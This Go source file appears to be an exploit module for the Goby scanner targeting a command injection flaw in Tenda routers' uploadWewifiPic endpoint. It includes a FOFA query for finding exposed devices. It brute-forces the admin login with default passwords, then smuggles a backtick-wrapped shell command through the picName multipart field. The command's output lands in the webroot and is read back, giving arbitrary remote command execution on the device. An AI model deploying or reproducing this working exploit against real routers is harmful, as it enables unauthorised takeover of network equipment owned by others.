package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tenda Auth uploadWewifiPic RCE",
    "Description": "<p>Tenda router is an efficient and practical router.</p><p>There is a command execution vulnerability in the uploadWewifiPic route in the background of Tenda routers. Attackers can use the vulnerability to execute arbitrary commands to obtain server permissions.</p>",
    "Impact": "Tenda Auth uploadWewifiPic RCE",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.tenda.com.cn\">https://www.tenda.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Tenda",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Tenda 路由器 uploadWewifiPic 参数后台命令执行漏洞",
            "Description": "<p>腾达路由器是一款高效实用的路由器。</p><p>腾达路由器后台 uploadWewifiPic 路由存在命令执行漏洞，攻击者可利用漏洞执行任意命令获取服务器权限。</p>",
            "Impact": "<p>腾达路由器后台 uploadWewifiPic 路由存在命令执行漏洞，攻击者可利用漏洞执行任意命令获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.tenda.com.cn\">https://www.tenda.com.cn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "腾达",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Tenda Auth uploadWewifiPic RCE",
            "Description": "<p>Tenda router is an efficient and practical router.</p><p>There is a command execution vulnerability in the uploadWewifiPic route in the background of Tenda routers. Attackers can use the vulnerability to execute arbitrary commands to obtain server permissions.</p>",
            "Impact": "Tenda Auth uploadWewifiPic RCE",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.tenda.com.cn\">https://www.tenda.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "Tenda",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"Tenda|登录\" && body=\"tenda.css\"",
    "GobyQuery": "body=\"Tenda|登录\" && body=\"tenda.css\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.tenda.com.cn",
    "DisclosureDate": "2022-02-04",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ip addr",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10256"
}`

	LoginBruteodsal := func(hostinfo *httpclient.FixUrl) {
		password := [3]string{"Z3Vlc3Q%3D", "YWRtaW4%3D", "MTIzNDU2"}
		for i := 0; i < len(password); i++ {
			uri := "/login/Auth"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = `username=admin&password=` + password[i]
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
				if strings.Contains(resp.HeaderString.String(), "user=admin") {
					break
				}
			}
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			LoginBruteodsal(u)
			RandName := goutils.RandomHexString(4)
			uri1 := "/cgi-bin/uploadWewifiPic"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryEHyn0rb3RDhDg11R")
			cfg1.Header.Store("Cookie", "user=admin")
			cfg1.Data = fmt.Sprintf("------WebKitFormBoundaryEHyn0rb3RDhDg11R\r\nContent-Disposition: form-data; name=\"picName\"\r\n\r\nwewifipic1`ls>/webroot/%s.txt`\r\n------WebKitFormBoundaryEHyn0rb3RDhDg11R\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"%s.png\"\r\nContent-Type: image/png\r\n\r\n1\r\n------WebKitFormBoundaryEHyn0rb3RDhDg11R--", RandName, RandName)
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/" + RandName + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", "user=admin")
				if resp2, err2 := httpclient.DoHttpRequest(u, cfg2); err2 == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "webroot")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandName := goutils.RandomHexString(4)
			LoginBruteodsal(expResult.HostInfo)
			uri1 := "/cgi-bin/uploadWewifiPic"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryEHyn0rb3RDhDg11R")
			cfg1.Header.Store("Cookie", "user=admin")
			cfg1.Data = fmt.Sprintf("------WebKitFormBoundaryEHyn0rb3RDhDg11R\r\nContent-Disposition: form-data; name=\"picName\"\r\n\r\nwewifipic1`%s>/webroot/%s.txt`\r\n------WebKitFormBoundaryEHyn0rb3RDhDg11R\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"%s.png\"\r\nContent-Type: image/png\r\n\r\n1\r\n------WebKitFormBoundaryEHyn0rb3RDhDg11R--", cmd, RandName, RandName)
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/" + RandName + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", "user=admin")
				if resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err2 == nil && resp2.StatusCode == 200 {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
